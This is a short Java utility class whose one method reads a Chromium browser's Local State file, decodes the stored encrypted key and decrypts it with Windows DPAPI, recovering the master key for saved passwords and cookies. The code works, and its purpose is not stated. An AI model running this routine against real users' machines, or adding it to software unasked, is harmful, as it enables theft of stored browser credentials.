package io.github.luxotick.utils;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.File;
import java.io.FileReader;
import java.util.Arrays;
import java.util.Base64;


public class KeyUtil {
    public static byte[] getKey(File path) {
        try {

            JsonObject localStateJson = new Gson().fromJson(new FileReader(path), JsonObject.class);
            byte[] encryptedKeyBytes = localStateJson.get("os_crypt").getAsJsonObject().get("encrypted_key").getAsString().getBytes();
            encryptedKeyBytes = Base64.getDecoder().decode(encryptedKeyBytes);
            encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, 5, encryptedKeyBytes.length);
            return Crypt32Util.cryptUnprotectData(encryptedKeyBytes);
        }
        catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
